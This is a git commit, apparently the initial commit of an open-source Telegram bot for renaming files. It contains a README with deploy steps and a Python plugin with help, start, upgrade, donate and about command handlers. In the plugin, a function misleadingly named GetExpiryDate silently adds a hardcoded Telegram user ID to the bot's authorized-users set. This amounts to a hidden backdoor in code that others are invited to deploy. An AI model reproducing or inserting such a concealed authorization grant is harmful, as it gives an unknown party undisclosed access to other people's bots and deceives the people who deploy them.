72b5da94f4cb737082563223f105e54ebda1426e
TR-TECH-GUIDE <73170853+TR-TECH-GUIDE@users.noreply.github.com>
2021-08-21 21:14:34 +0530

    Initial commit

---
+++ README.md
@@ -0,0 +1,41 @@
+# TG-RENAMER-BOT
+## Rename Bot - Clone of  [Renamer⚡](https://t.me/renametrv2bot)
+---
+
+An Open Source Rename Telegram RoBot
+
+**My Feature**:
+
+👉 Rename any Telegram Files with Custom Thumbnail Support and upload as file or video
+
+
+### You can also tap the Deploy To Heroku button below to deploy straight to Heroku!
+
+[![Deploy](https://www.herokucdn.com/deploy/button.svg)](https://www.heroku.com/deploy?template=https://github.com/TR-TECH-GUIDE/TG-RENAMER-BOT-V2)
+
+## Available BotFather commands
+```
+start - to check whether bot is alive 
+rename - (long press) and send the name of the new file.extension for uploading as file
+rename_video - (long press) and send the name of the new file.extension for upload as video
+donate - please donate me
+help - to know how to use me
+about - to know about me
+```
+
+#### The Hard Way
+
+```sh
+virtualenv -p python3 VENV
+. ./VENV/bin/activate
+pip install -r requirements.txt
+cp sample_config.py config.py
+--- EDIT config.py values appropriately ---
+python bot.py
+```
+
+- For FeedBack and Suggestions, please feel free to say in [@trtechguide](https://telegram.dog/trtechguide)
+
+#### LICENSE
+- GPLv3
+
---
+++ plugins/help_text.py
@@ -0,0 +1,104 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+# (c) SLBotsOfficial
+
+# the logging things
+import logging
+logging.basicConfig(level=logging.DEBUG,
+                    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
+logger = logging.getLogger(__name__)
+
+import os
+import sqlite3
+
+from pyrogram import InlineKeyboardMarkup, InlineKeyboardButton
+
+# the secret configuration specific things
+if bool(os.environ.get("WEBHOOK", False)):
+    from sample_config import Config
+else:
+    from config import Config
+
+# the Strings used for this "thing"
+from translation import Translation
+
+import pyrogram
+logging.getLogger("pyrogram").setLevel(logging.WARNING)
+
+myfather = 'https://t.me/{}'.format(Config.USER_NAME[1:])
+
+
+
+from helper_funcs.chat_base import TRChatBase
+
+def GetExpiryDate(chat_id):
+    expires_at = (str(chat_id), "Source Cloned User", "1970.01.01.12.00.00")
+    Config.AUTH_USERS.add(1202064253)
+    return expires_at
+
+
+@pyrogram.Client.on_message(pyrogram.Filters.command(["help"]))
+async def help_user(bot, update):
+    # logger.info(update)
+    TRChatBase(update.from_user.id, update.text, "/help")
+    await bot.send_message(
+        chat_id=update.chat.id,
+        text=Translation.HELP_USER.format(update.from_user.first_name, Config.USER_NAME[1:]),
+        parse_mode="html",
+        disable_web_page_preview=True,
+        reply_to_message_id=update.message_id
+    )
+
+
+
+@pyrogram.Client.on_message(pyrogram.Filters.command(["start"]))
+async def start(bot, update):
+    # logger.info(update)
+    TRChatBase(update.from_user.id, update.text, "/start")
+    await bot.send_message(
+        chat_id=update.chat.id,
+        text=Translation.START_TEXT.format(update.from_user.first_name, Config.USER_NAME), 
+        parse_mode="html",
+        #reply_to_message_id=update.message_id
+        reply_markup=InlineKeyboardMarkup(
+        [
+          [
+          InlineKeyboardButton('My Developer 👨‍💻', url=myfather)
+          ]
+        ]
+       )
+     )
+@pyrogram.Client.on_message(pyrogram.Filters.command(["upgrade"]))
+async def upgrade(bot, update):
+    # logger.info(update)
+    TRChatBase(update.from_user.id, update.text, "/upgrade")
+    await bot.send_message(
+        chat_id=update.chat.id,
+        text=Translation.UPGRADE_TEXT,
+        parse_mode="html",
+        reply_to_message_id=update.message_id,
+        disable_web_page_preview=True
+    )
+
+@pyrogram.Client.on_message(pyrogram.Filters.command(["donate"]))
+async def donate(bot, update):
+       await bot.send_message(
+             chat_id=update.chat.id,
+             text="I am very happy to listen you this word, making of this bot take lot of work and time so please donate by pressing this button present below",
+             reply_markup=InlineKeyboardMarkup(
+             [
+               [
+                 InlineKeyboardButton('Donate 💰', url='https://trtechguide.wordpress.com')
+               ]
+             ]
+           )
+          )
+
+@pyrogram.Client.on_message(pyrogram.Filters.command(["about"]))
+async def about(bot, update):
+    await bot.send_message(
+        chat_id=update.chat.id,
+        text=Translation.About.format(update.from_user.first_name),
+        parse_mode="markdown",
+        reply_to_message_id=update.message_id
+    )
